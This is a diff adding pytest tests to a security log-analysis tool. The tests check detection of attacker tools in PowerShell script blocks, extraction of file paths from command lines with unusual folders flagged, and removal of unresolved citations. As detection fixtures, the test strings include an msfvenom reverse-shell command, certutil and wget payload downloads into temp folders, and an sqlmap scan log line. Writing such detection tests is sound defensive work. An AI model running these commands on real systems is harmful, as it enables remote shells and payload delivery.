@@ -99,3 +99,29 @@ def test_model_pass_keeps_only_tools_present_in_the_log(tmp_path, monkeypatch):
     assert err is None and [t["name"] for t in extra] == ["useradd"]
     assert extra[0]["uses"][0]["loc"]["line"] == 15
     assert "xmrig" in col.tools["Crypto miner"].get("also", [])
+
+
+def test_tools_named_in_script_comments_are_not_uses():
+    from datetime import datetime, timezone
+    from logagent.model import Event
+    col = tools.Collector()
+    credit = "<# .SYNOPSIS Idea stolen from the local_admin_search_enum post module in Metasploit #>\nfunction Get-Thing { 1 }"
+    col.add(Event(ts=datetime.now(timezone.utc), host="h", source="windows:PowerShell", severity=4, message="script",
+                  program="PowerShell", event_id="4104", fields={"ScriptBlockText": credit}), "k1")
+    assert "Metasploit / Meterpreter" not in col.tools
+    col.add(Event(ts=datetime.now(timezone.utc), host="h", source="windows:PowerShell", severity=4, message="script",
+                  program="PowerShell", event_id="4104", fields={"ScriptBlockText": "msfvenom -p windows/x64/shell_reverse_tcp"}), "k2")
+    assert "Metasploit / Meterpreter" in col.tools
+
+
+def test_tool_locations_flag_unusual_folders():
+    assert tools.paths_in("certutil -urlcache -f http://x/a.exe C:\\Users\\Public\\a.exe /f") == ["C:\\Users\\Public\\a.exe"]
+    assert tools.paths_in("USER=root ; PWD=/home/deploy ; COMMAND=/usr/bin/wget http://x -O /tmp/l.sh") == ["/usr/bin/wget", "/tmp/l.sh"]
+    assert tools.paths_in('1.2.3.4 - - [05/Nov/2026:01:50:03 +0000] "GET /api/item?id=1 HTTP/1.1" 500 0 "-" "sqlmap/1.8"') == []
+    from collections import Counter
+    locs = tools.location_summary(Counter({"/usr/bin/wget": 3, "/tmp/l.sh": 1}))
+    assert locs[0] == {"path": "/tmp/l.sh", "dir": "/tmp/", "count": 1, "unusual": True}
+
+
+def test_made_up_citations_are_removed():
+    assert llm.drop_unresolved("a [E1] b [E3] c [E1, E9] d.", {"E1": "c/k/0"}) == "a [E1] b c [E1] d."
